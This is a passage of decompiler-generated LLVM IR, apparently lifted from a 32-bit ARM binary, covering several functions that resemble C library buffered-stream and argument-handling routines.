.preheader:                                       ; preds = %dec_label_pc_138a0, %bb23
  %v2_138b4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_138c8
  %v2_138b4 = phi i32 [ %v2_138b4.pre, %.preheader ], [ %v1_138cc, %dec_label_pc_138c8 ]
  %v0_138a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_138a8 = inttoptr i32 %v0_138a8 to i8*
  %v2_138a8 = load i8, i8* %v1_138a8, align 1
  %v3_138a8 = zext i8 %v2_138a8 to i32
  store i32 %v3_138a8, i32* %r3.global-to-local, align 4
  %v7_138ac = icmp eq i8 %v2_138a8, 10
  store i1 %v7_138ac, i1* %cpsr_z.global-to-local, align 1
  %v1_138b0 = add i32 %v0_138a8, 1
  store i32 %v1_138b0, i32* %r6.global-to-local, align 4
  %v3_138b4 = inttoptr i32 %v2_138b4 to i8*
  store i8 %v2_138a8, i8* %v3_138b4, align 1
  %v0_138b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_138b8, label %dec_label_pc_138bc, label %dec_label_pc_138c8

dec_label_pc_138bc:                               ; preds = %bb24
  %v0_138bc = load i32, i32* %r4.global-to-local, align 4
  %v1_138bc = inttoptr i32 %v0_138bc to i16*
  %v2_138bc = load i16, i16* %v1_138bc, align 2
  %v3_138bc = zext i16 %v2_138bc to i32
  store i32 %v3_138bc, i32* %r3.global-to-local, align 4
  %v1_138c0 = and i32 %v3_138bc, 256
  %v2_138c0 = icmp eq i32 %v1_138c0, 0
  store i1 %v2_138c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_138c0, label %dec_label_pc_138c8, label %dec_label_pc_138bc.dec_label_pc_138d4_crit_edge

dec_label_pc_138bc.dec_label_pc_138d4_crit_edge:  ; preds = %dec_label_pc_138bc
  %v0_138d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_138d4

dec_label_pc_138c8:                               ; preds = %dec_label_pc_138bc, %bb24
  %v0_138c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_138c8 = add i32 %v0_138c8, -1
  store i32 %v1_138c8, i32* %r2.global-to-local, align 4
  %v7_138c8 = icmp eq i32 %v0_138c8, 1
  store i1 %v7_138c8, i1* %cpsr_z.global-to-local, align 1
  %v0_138cc = load i32, i32* %r1.global-to-local, align 4
  %v1_138cc = add i32 %v0_138cc, 1
  store i32 %v1_138cc, i32* %r1.global-to-local, align 4
  br i1 %v7_138c8, label %dec_label_pc_138c8.dec_label_pc_138d4_crit_edge, label %bb24

dec_label_pc_138c8.dec_label_pc_138d4_crit_edge:  ; preds = %dec_label_pc_138c8
  %v0_138d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_138d4

dec_label_pc_138d4:                               ; preds = %dec_label_pc_138bc.dec_label_pc_138d4_crit_edge, %dec_label_pc_138c8.dec_label_pc_138d4_crit_edge
  %v0_138d8 = phi i32 [ %v1_138cc, %dec_label_pc_138c8.dec_label_pc_138d4_crit_edge ], [ %v0_138d8.pre, %dec_label_pc_138bc.dec_label_pc_138d4_crit_edge ]
  %v0_138d4 = phi i32 [ %v0_138d4.pre, %dec_label_pc_138c8.dec_label_pc_138d4_crit_edge ], [ %v0_138bc, %dec_label_pc_138bc.dec_label_pc_138d4_crit_edge ]
  %v1_138d4 = add i32 %v0_138d4, 8
  %v2_138d4 = inttoptr i32 %v1_138d4 to i32*
  %v3_138d4 = load i32, i32* %v2_138d4, align 4
  store i32 %v3_138d4, i32* %r3.global-to-local, align 4
  %v2_138d8 = add i32 %v0_138d4, 16
  %v3_138d8 = inttoptr i32 %v2_138d8 to i32*
  store i32 %v0_138d8, i32* %v3_138d8, align 4
  %v0_138dc = load i32, i32* %r3.global-to-local, align 4
  %v1_138dc = load i32, i32* %r1.global-to-local, align 4
  %v2_138dc = sub i32 %v1_138dc, %v0_138dc
  store i32 %v2_138dc, i32* %r3.global-to-local, align 4
  %v1_138e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_138e0 = sub i32 %v1_138e0, %v2_138dc
  store i32 %v2_138e0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_138e4

dec_label_pc_138e4:                               ; preds = %dec_label_pc_13884.dec_label_pc_138e4_crit_edge, %dec_label_pc_138d4
  %v0_138e4 = phi i32 [ %v0_138e4.pre, %dec_label_pc_13884.dec_label_pc_138e4_crit_edge ], [ %v2_138e0, %dec_label_pc_138d4 ]
  %v1_138e4 = load i32, i32* @r7, align 4
  %v2_138e4 = sub i32 %v1_138e4, %v0_138e4
  br label %dec_label_pc_138e8

dec_label_pc_13858.dec_label_pc_138e8.loopexit_crit_edge: ; preds = %dec_label_pc_13858thread-pre-split
  %v0_138e8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_138e8

dec_label_pc_138e8:                               ; preds = %dec_label_pc_13840, %dec_label_pc_13858.dec_label_pc_138e8.loopexit_crit_edge, %dec_label_pc_138e4
  %v0_138e8 = phi i32 [ %v2_138e4, %dec_label_pc_138e4 ], [ %v0_138e8.pre.pre, %dec_label_pc_13858.dec_label_pc_138e8.loopexit_crit_edge ], [ 0, %dec_label_pc_13840 ]
  %v2_138ec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_138ec, i32* %r4.global-to-local, align 4
  store i32 %v12_13840, i32* @r7, align 4
  ret i32 %v0_138e8

; uselistorder directives
  uselistorder i32 %v0_138d4, { 1, 0 }
  uselistorder i32 %v1_138cc, { 0, 2, 1 }
  uselistorder i32 %v0_138c8, { 1, 0 }
  uselistorder i32 %v1_138a0, { 0, 2, 1 }
  uselistorder i32 %v0_138a0, { 1, 0 }
  uselistorder i32 %v5_1388c, { 1, 0 }
  uselistorder i32 %v2_1388c, { 1, 0, 2 }
  uselistorder i32 %v3_13870, { 2, 3, 0, 1 }
  uselistorder i32 %v0_13868, { 1, 0 }
  uselistorder i32 %v5_1387c, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 6, 4, 2, 1, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 5, 0, 2, 3, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 6, 5, 2, 3, 4, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 6, 8, 7, 5, 1, 2, 3, 4, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 7, 8, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 2147483647, { 1, 6, 2, 5, 3, 4, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_138e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_138e4, { 1, 0 }
  uselistorder label %dec_label_pc_138d4, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13860, { 1, 0 }
}

define i32 @function_138f4(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_138f4:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_138f4 = load i32, i32* @r4, align 4
  store i32 %v3_138f4, i32* %stack_var_-20, align 4
  %v6_138f4 = load i32, i32* @r5, align 4
  %v9_138f4 = load i32, i32* @r6, align 4
  %v12_138f4 = load i32, i32* @r7, align 4
  %v3_138f8 = load i16, i16* %arg3, align 2
  %v4_138f8 = zext i16 %v3_138f8 to i32
  %v1_138fc = and i32 %v4_138f8, 512
  store i32 %v1_138fc, i32* @r4, align 4
  %v2_138fc = icmp eq i32 %v1_138fc, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_138fc, label %dec_label_pc_13914, label %dec_label_pc_13a10

dec_label_pc_13914:                               ; preds = %dec_label_pc_138f4
  %v2_13914 = add i32 %tmp, 4
  %v3_13914 = inttoptr i32 %v2_13914 to i32*
  %v4_13914 = load i32, i32* %v3_13914, align 4
  %v2_1391c = add i32 %tmp, 16
  %v3_1391c = inttoptr i32 %v2_1391c to i32*
  %v4_1391c = load i32, i32* %v3_1391c, align 4
  store i32 %v4_1391c, i32* @r0, align 4
  %v2_13920 = add i32 %tmp, 12
  %v3_13920 = inttoptr i32 %v2_13920 to i32*
  %v4_13920 = load i32, i32* %v3_13920, align 4
  store i32 %v4_13920, i32* @r3, align 4
  %v4_13924 = icmp eq i32 %v4_13914, -2
  %v2_13928 = sub i32 %v4_13920, %v4_1391c
  br i1 %v4_13924, label %dec_label_pc_13928, label %dec_label_pc_13950

dec_label_pc_13928:                               ; preds = %dec_label_pc_13914
  %v3_1392c = icmp ugt i32 %v2_13928, %arg2
  br i1 %v3_1392c, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_13928
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_13928, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_13928, %dec_label_pc_13928 ]
  %v0_13934 = phi i32 [ %arg2, %bb ], [ %v2_13928, %dec_label_pc_13928 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_13934, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1393c = call i32 @function_f700()
  %v0_13940 = load i32, i32* @r5, align 4
  %v1_13940 = add i32 %v0_13940, 16
  %v2_13940 = inttoptr i32 %v1_13940 to i32*
  %v3_13940 = load i32, i32* %v2_13940, align 4
  %v1_13944 = load i32, i32* @r4, align 4
  %v2_13944 = add i32 %v1_13944, %v3_13940
  store i32 %v2_13944, i32* %v2_13940, align 4
  br label %dec_label_pc_13a24

dec_label_pc_13950:                               ; preds = %dec_label_pc_13914
  store i32 %v2_13928, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_13928, %arg2
  br i1 %tmp18, label %dec_label_pc_139f0, label %dec_label_pc_1395c

dec_label_pc_1395c:                               ; preds = %dec_label_pc_13950
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_13964 = call i32 @function_f700()
  %v0_13968 = load i32, i32* @r5, align 4
  %v1_13968 = add i32 %v0_13968, 16
  %v2_13968 = inttoptr i32 %v1_13968 to i32*
  %v3_13968 = load i32, i32* %v2_13968, align 4
  %v1_1396c = inttoptr i32 %v0_13968 to i16*
  %v2_1396c = load i16, i16* %v1_1396c, align 2
  %v1_13970 = load i32, i32* @r6, align 4
  %v2_13970 = add i32 %v1_13970, %v3_13968
  %v1_13974 = and i16 %v2_1396c, 256
  %v2_13974 = icmp eq i16 %v1_13974, 0
  store i32 %v2_13970, i32* %v2_13968, align 4
  br i1 %v2_13974, label %dec_label_pc_13a24, label %dec_label_pc_13980

dec_label_pc_13980:                               ; preds = %dec_label_pc_1395c
  %v0_13980 = load i32, i32* @r7, align 4
  %v0_13988 = load i32, i32* @r6, align 4
  %v4_1398c = call i32 @function_14dec(i32 %v0_13980, i32 10, i32 %v0_13988, i32 %v2_13970)
  %v2_13990 = icmp eq i32 %v4_1398c, 0
  br i1 %v2_13990, label %dec_label_pc_13a24, label %dec_label_pc_13998

dec_label_pc_13998:                               ; preds = %dec_label_pc_13980
  %v0_13998 = load i32, i32* @r5, align 4
  store i32 %v0_13998, i32* @r0, align 4
  %v0_1399c = call i32 @function_dc5c()
  %v2_139a0 = icmp eq i32 %v0_1399c, 0
  br i1 %v2_139a0, label %dec_label_pc_13a24, label %dec_label_pc_139a8

dec_label_pc_139a8:                               ; preds = %dec_label_pc_13998
  %v1_139a8 = load i32, i32* @r6, align 4
  %v3_139a8 = icmp uge i32 %v0_1399c, %v1_139a8
  %v1_139a8.v0_1399c = select i1 %v3_139a8, i32 %v1_139a8, i32 %v0_1399c
  store i32 %v1_139a8.v0_1399c, i32* @r4, align 4
  %v2_139b4 = sub i32 %v1_139a8, %v1_139a8.v0_1399c
  %v0_139b8 = load i32, i32* @r7, align 4
  %v2_139b8 = add i32 %v0_139b8, %v2_139b4
  store i32 %v2_139b8, i32* %r7.global-to-local, align 4
  store i32 %v2_139b8, i32* @r0, align 4
  store i32 %v1_139a8.v0_1399c, i32* @r2, align 4
  %v4_139c8 = call i32 @function_14b90(i32 %v2_139b8, i32 10, i32 %v1_139a8.v0_1399c, i32 %v2_139b4)
  %v2_139cc = icmp eq i32 %v4_139c8, 0
  br i1 %v2_139cc, label %dec_label_pc_13a24, label %dec_label_pc_139d4

dec_label_pc_139d4:                               ; preds = %dec_label_pc_139a8
  %v0_139d4 = load i32, i32* @r5, align 4
  %v1_139d4 = add i32 %v0_139d4, 16
  %v2_139d4 = inttoptr i32 %v1_139d4 to i32*
  %v3_139d4 = load i32, i32* %v2_139d4, align 4
  %v0_139d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_139d8 = load i32, i32* @r4, align 4
  %v2_139d8 = sub i32 %v0_139d8, %v4_139c8
  %v2_139dc = add i32 %v2_139d8, %v1_139d8
  %v2_139e0 = sub i32 %v3_139d4, %v2_139dc
  %v1_139e4 = load i32, i32* @r6, align 4
  %v2_139e4 = sub i32 %v1_139e4, %v2_139dc
  store i32 %v2_139e4, i32* @r6, align 4
  store i32 %v2_139e0, i32* %v2_139d4, align 4
  br label %dec_label_pc_13a24

dec_label_pc_139f0:                               ; preds = %dec_label_pc_13950
  %v2_139f0 = add i32 %tmp, 8
  %v3_139f0 = inttoptr i32 %v2_139f0 to i32*
  %v4_139f0 = load i32, i32* %v3_139f0, align 4
  %v9_139f4 = icmp eq i32 %v4_1391c, %v4_139f0
  br i1 %v9_139f4, label %dec_label_pc_13a10, label %dec_label_pc_139fc

dec_label_pc_139fc:                               ; preds = %dec_label_pc_139f0
  store i32 %tmp, i32* @r0, align 4
  %v0_13a00 = call i32 @function_dc5c()
  %v2_13a04 = icmp eq i32 %v0_13a00, 0
  br i1 %v2_13a04, label %dec_label_pc_139fc.dec_label_pc_13a10_crit_edge, label %bb15

dec_label_pc_139fc.dec_label_pc_13a10_crit_edge:  ; preds = %dec_label_pc_139fc
  %v0_13a10.pre = load i32, i32* @r6, align 4
  %v0_13a14.pre = load i32, i32* @r5, align 4
  %v0_13a18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13a10

bb15:                                             ; preds = %dec_label_pc_139fc
  %v1_13a08 = load i32, i32* @r4, align 4
  store i32 %v1_13a08, i32* @r6, align 4
  br label %dec_label_pc_13a24

dec_label_pc_13a10:                               ; preds = %dec_label_pc_139fc.dec_label_pc_13a10_crit_edge, %dec_label_pc_138f4, %dec_label_pc_139f0
  %v0_13a18 = phi i32 [ %v0_13a18.pre, %dec_label_pc_139fc.dec_label_pc_13a10_crit_edge ], [ %arg1, %dec_label_pc_138f4 ], [ %arg1, %dec_label_pc_139f0 ]
  %v0_13a14 = phi i32 [ %v0_13a14.pre, %dec_label_pc_139fc.dec_label_pc_13a10_crit_edge ], [ %tmp, %dec_label_pc_138f4 ], [ %tmp, %dec_label_pc_139f0 ]
  %v0_13a10 = phi i32 [ %v0_13a10.pre, %dec_label_pc_139fc.dec_label_pc_13a10_crit_edge ], [ %arg2, %dec_label_pc_138f4 ], [ %arg2, %dec_label_pc_139f0 ]
  %v1_13a14 = inttoptr i32 %v0_13a14 to i16*
  %v5_13a1c = call i32 @function_13840(i16* %v1_13a14, i32 %v0_13a18, i32 %v0_13a10)
  store i32 %v5_13a1c, i32* @r6, align 4
  br label %dec_label_pc_13a24

dec_label_pc_13a24:                               ; preds = %bb15, %dec_label_pc_139a8, %dec_label_pc_13998, %dec_label_pc_13980, %dec_label_pc_1395c, %dec_label_pc_139d4, %bb12, %dec_label_pc_13a10
  %v0_13a24 = load i32, i32* @r6, align 4
  %v2_13a2c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13a2c, i32* @r4, align 4
  store i32 %v6_138f4, i32* @r5, align 4
  store i32 %v9_138f4, i32* @r6, align 4
  store i32 %v12_138f4, i32* @r7, align 4
  ret i32 %v0_13a24

; uselistorder directives
  uselistorder i32 %v2_139dc, { 1, 0 }
  uselistorder i32 %v2_139b4, { 1, 0 }
  uselistorder i32 %v1_139a8.v0_1399c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_139a8, { 1, 0, 2 }
  uselistorder i32 %v2_13928, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 (i16*, i32, i32)* @function_13840, { 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13a24, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_13a10, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @function_13a34(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13a34:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13a34 = load i32, i32* @r4, align 4
  store i32 %v3_13a34, i32* %stack_var_-8, align 4
  %v3_13a38 = load i16, i16* %arg1, align 2
  %v4_13a38 = zext i16 %v3_13a38 to i32
  %v2_13a3c = and i32 %v4_13a38, %arg2
  %v4_13a3c = icmp eq i32 %v2_13a3c, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_13a3c, label %dec_label_pc_13a48, label %dec_label_pc_13a58

dec_label_pc_13a48:                               ; preds = %dec_label_pc_13a34
  %v1_13a48 = and i32 %v4_13a38, 2176
  %v2_13a48 = icmp eq i32 %v1_13a48, 0
  br i1 %v2_13a48, label %dec_label_pc_13a50, label %dec_label_pc_13a64

dec_label_pc_13a50:                               ; preds = %dec_label_pc_13a48
  %v2_13a50 = or i32 %v4_13a38, %arg2
  %v1_13a54 = trunc i32 %v2_13a50 to i16
  store i16 %v1_13a54, i16* %arg1, align 2
  %v0_13a58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13a58

dec_label_pc_13a58:                               ; preds = %dec_label_pc_13a34, %dec_label_pc_13a50
  %v0_13a94 = phi i32 [ %tmp, %dec_label_pc_13a34 ], [ %v0_13a58.pre, %dec_label_pc_13a50 ]
  %v1_13a58 = inttoptr i32 %v0_13a94 to i16*
  %v2_13a58 = load i16, i16* %v1_13a58, align 2
  %v3_13a58 = zext i16 %v2_13a58 to i32
  store i32 %v3_13a58, i32* @ip, align 4
  %v1_13a5c = and i32 %v3_13a58, 32
  %v2_13a5c = icmp eq i32 %v1_13a5c, 0
  br i1 %v2_13a5c, label %dec_label_pc_13a84, label %dec_label_pc_13a64

dec_label_pc_13a64:                               ; preds = %dec_label_pc_13a48, %dec_label_pc_13a58
  %v0_13a64 = call i32 @function_d0ec()
  store i32 %v0_13a64, i32* %r0.global-to-local, align 4
  %v2_13a6c = inttoptr i32 %v0_13a64 to i32*
  store i32 9, i32* %v2_13a6c, align 4
  br label %dec_label_pc_13a70

dec_label_pc_13a70:                               ; preds = %dec_label_pc_13aac, %dec_label_pc_13a64
  %v0_13a70 = load i32, i32* @r4, align 4
  %v1_13a70 = inttoptr i32 %v0_13a70 to i16*
  %v2_13a70 = load i16, i16* %v1_13a70, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_13a78 = or i16 %v2_13a70, 8
  store i16 %v1_13a78, i16* %v1_13a70, align 2
  br label %bb11

dec_label_pc_13a84:                               ; preds = %dec_label_pc_13a58
  %tmp14 = urem i16 %v2_13a58, 4
  %v2_13a84 = icmp eq i16 %tmp14, 0
  br i1 %v2_13a84, label %dec_label_pc_13ae0, label %dec_label_pc_13a8c

dec_label_pc_13a8c:                               ; preds = %dec_label_pc_13a84
  %v1_13a8c = and i32 %v3_13a58, 4
  store i32 %v1_13a8c, i32* @r1, align 4
  %v2_13a8c = icmp eq i32 %v1_13a8c, 0
  br i1 %v2_13a8c, label %dec_label_pc_13a94, label %dec_label_pc_13ac4

dec_label_pc_13a94:                               ; preds = %dec_label_pc_13a8c
  %v1_13a94 = add i32 %v0_13a94, 20
  %v2_13a94 = inttoptr i32 %v1_13a94 to i32*
  %v3_13a94 = load i32, i32* %v2_13a94, align 4
  store i32 %v3_13a94, i32* %r2.global-to-local, align 4
  %v1_13a98 = add i32 %v0_13a94, 16
  %v2_13a98 = inttoptr i32 %v1_13a98 to i32*
  %v3_13a98 = load i32, i32* %v2_13a98, align 4
  %v9_13a9c = icmp eq i32 %v3_13a94, %v3_13a98
  br i1 %v9_13a9c, label %dec_label_pc_13aa4, label %dec_label_pc_13aac

dec_label_pc_13aa4:                               ; preds = %dec_label_pc_13a94
  %v1_13aa4 = and i32 %v3_13a58, 2
  %v2_13aa4 = icmp eq i32 %v1_13aa4, 0
  br i1 %v2_13aa4, label %dec_label_pc_13ac4, label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a94, %dec_label_pc_13aa4
  %v1_13aac = and i32 %v3_13a58, 1024
  %tmp12 = udiv i32 %v1_13aac, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_13ab8 = call i32 @function_15b24()
  store i32 %v0_13ab8, i32* %r0.global-to-local, align 4
  %v2_13abc = icmp eq i32 %v0_13ab8, 0
  br i1 %v2_13abc, label %.dec_label_pc_13ac4_crit_edge, label %dec_label_pc_13a70

.dec_label_pc_13ac4_crit_edge:                    ; preds = %dec_label_pc_13aac
  %v0_13ac4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13ac4

dec_label_pc_13ac4:                               ; preds = %.dec_label_pc_13ac4_crit_edge, %dec_label_pc_13a8c, %dec_label_pc_13aa4
  %v2_13ad0 = phi i32 [ %v0_13ac4.pre, %.dec_label_pc_13ac4_crit_edge ], [ %v0_13a94, %dec_label_pc_13a8c ], [ %v0_13a94, %dec_label_pc_13aa4 ]
  %v1_13ac4 = inttoptr i32 %v2_13ad0 to i16*
  %v2_13ac4 = load i16, i16* %v1_13ac4, align 2
  %v1_13ac8 = add i32 %v2_13ad0, 8
  %v2_13ac8 = inttoptr i32 %v1_13ac8 to i32*
  %v3_13ac8 = load i32, i32* %v2_13ac8, align 4
  store i32 %v3_13ac8, i32* %r2.global-to-local, align 4
  %v1_13acc = and i16 %v2_13ac4, -4
  store i16 %v1_13acc, i16* %v1_13ac4, align 2
  %v0_13ad4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ad4 = load i32, i32* @r4, align 4
  %v2_13ad4 = add i32 %v1_13ad4, 20
  %v3_13ad4 = inttoptr i32 %v2_13ad4 to i32*
  store i32 %v0_13ad4, i32* %v3_13ad4, align 4
  %v0_13ad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ad8 = load i32, i32* @r4, align 4
  %v2_13ad8 = add i32 %v1_13ad8, 24
  %v3_13ad8 = inttoptr i32 %v2_13ad8 to i32*
  store i32 %v0_13ad8, i32* %v3_13ad8, align 4
  %v0_13adc = load i32, i32* %r2.global-to-local, align 4
  %v1_13adc = load i32, i32* @r4, align 4
  %v2_13adc = add i32 %v1_13adc, 16
  %v3_13adc = inttoptr i32 %v2_13adc to i32*
  store i32 %v0_13adc, i32* %v3_13adc, align 4
  %v0_13ae0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13ae0

dec_label_pc_13ae0:                               ; preds = %dec_label_pc_13a84, %dec_label_pc_13ac4
  %v2_13aec = phi i32 [ %v0_13a94, %dec_label_pc_13a84 ], [ %v0_13ae0.pre, %dec_label_pc_13ac4 ]
  %v1_13ae0 = inttoptr i32 %v2_13aec to i16*
  %v2_13ae0 = load i16, i16* %v1_13ae0, align 2
  %v3_13ae0 = zext i16 %v2_13ae0 to i32
  %v1_13ae4 = or i16 %v2_13ae0, 64
  %v1_13ae8 = and i32 %v3_13ae0, 2816
  store i32 %v1_13ae8, i32* %r0.global-to-local, align 4
  %v2_13ae8 = icmp eq i32 %v1_13ae8, 0
  store i16 %v1_13ae4, i16* %v1_13ae0, align 2
  br i1 %v2_13ae8, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_13ae0
  %v1_13af0 = load i32, i32* @r4, align 4
  %v2_13af0 = add i32 %v1_13af0, 12
  %v3_13af0 = inttoptr i32 %v2_13af0 to i32*
  %v4_13af0 = load i32, i32* %v3_13af0, align 4
  %v3_13af4 = add i32 %v1_13af0, 28
  %v4_13af4 = inttoptr i32 %v3_13af4 to i32*
  store i32 %v4_13af0, i32* %v4_13af4, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_13ae0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_13a70, %.thread1
  %v2_13afc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13afc, i32* @r4, align 4
  %v1_13b00 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13b00

; uselistorder directives
  uselistorder i32 %v2_13ad0, { 1, 0 }
  uselistorder i32 %v0_13a94, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_13a38, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ae0, { 1, 0 }
  uselistorder label %dec_label_pc_13ac4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13aac, { 1, 0 }
  uselistorder label %dec_label_pc_13a64, { 1, 0 }
  uselistorder label %dec_label_pc_13a58, { 1, 0 }
}

define i32 @function_13b04() local_unnamed_addr {
dec_label_pc_13b04:
  %v0_13b04 = load i32, i32* @r2, align 4
  %v1_13b04 = icmp slt i32 %v0_13b04, 0
  %v0_13b08 = load i32, i32* @r0, align 4
  %v1_13b0c = and i32 %v0_13b08, 2048
  %v2_13b40 = icmp eq i32 %v1_13b0c, 0
  br i1 %v1_13b04, label %dec_label_pc_13b40, label %dec_label_pc_13b14

dec_label_pc_13b14:                               ; preds = %dec_label_pc_13b04
  br i1 %v2_13b40, label %dec_label_pc_13b1c, label %dec_label_pc_13b48

dec_label_pc_13b1c:                               ; preds = %dec_label_pc_13b14
  %v7_13b1c = icmp eq i32 %v0_13b08, 256
  %v0_13b20 = load i32, i32* @r1, align 4
  %v1_13b20 = inttoptr i32 %v0_13b20 to i32*
  %v2_13b20 = load i32, i32* %v1_13b20, align 4
  %v2_13b24 = urem i32 %v2_13b20, 256
  %v2_13b24.v2_13b20 = select i1 %v7_13b1c, i32 %v2_13b24, i32 %v2_13b20
  br i1 %v7_13b1c, label %.thread, label %dec_label_pc_13b2c

dec_label_pc_13b2c:                               ; preds = %dec_label_pc_13b1c
  %v7_13b2c = icmp eq i32 %v0_13b08, 512
  br i1 %v7_13b2c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13b2c
  %v4_13b34 = urem i32 %v2_13b24.v2_13b20, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13b2c, %dec_label_pc_13b1c, %bb
  %v1_13b3c = phi i32 [ %v2_13b20, %dec_label_pc_13b2c ], [ %v2_13b24, %dec_label_pc_13b1c ], [ %v4_13b34, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_13b3c

dec_label_pc_13b40:                               ; preds = %dec_label_pc_13b04
  br i1 %v2_13b40, label %dec_label_pc_13b50, label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13b14, %dec_label_pc_13b40
  %v0_13b48 = load i32, i32* @r1, align 4
  %v1_13b48 = inttoptr i32 %v0_13b48 to i32*
  %v2_13b48 = load i32, i32* %v1_13b48, align 4
  %v3_13b48 = add i32 %v0_13b48, 4
  %v4_13b48 = inttoptr i32 %v3_13b48 to i32*
  %v5_13b48 = load i32, i32* %v4_13b48, align 4
  store i32 %v5_13b48, i32* @r1, align 4
  ret i32 %v2_13b48

dec_label_pc_13b50:                               ; preds = %dec_label_pc_13b40
  %v7_13b50 = icmp eq i32 %v0_13b08, 256
  %v0_13b54 = load i32, i32* @r1, align 4
  %v1_13b54 = inttoptr i32 %v0_13b54 to i32*
  %v2_13b54 = load i32, i32* %v1_13b54, align 4
  %v2_13b58 = urem i32 %v2_13b54, 256
  %v2_13b58.v2_13b54 = select i1 %v7_13b50, i32 %v2_13b58, i32 %v2_13b54
  br i1 %v7_13b50, label %.thread2, label %dec_label_pc_13b60

dec_label_pc_13b60:                               ; preds = %dec_label_pc_13b50
  %v7_13b60 = icmp eq i32 %v0_13b08, 512
  br i1 %v7_13b60, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_13b60
  %v4_13b64 = mul i32 %v2_13b58.v2_13b54, 65536
  %v4_13b68 = sdiv i32 %v4_13b64, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13b60, %dec_label_pc_13b50, %bb5
  %v0_13b6c = phi i32 [ %v2_13b54, %dec_label_pc_13b60 ], [ %v2_13b58, %dec_label_pc_13b50 ], [ %v4_13b68, %bb5 ]
  %v3_13b6c = ashr i32 %v0_13b6c, 31
  store i32 %v3_13b6c, i32* @r1, align 4
  ret i32 %v0_13b6c

; uselistorder directives
  uselistorder i32 %v0_13b6c, { 1, 0 }
  uselistorder i32 %v2_13b58, { 1, 0 }
  uselistorder i32 %v2_13b54, { 1, 2, 0 }
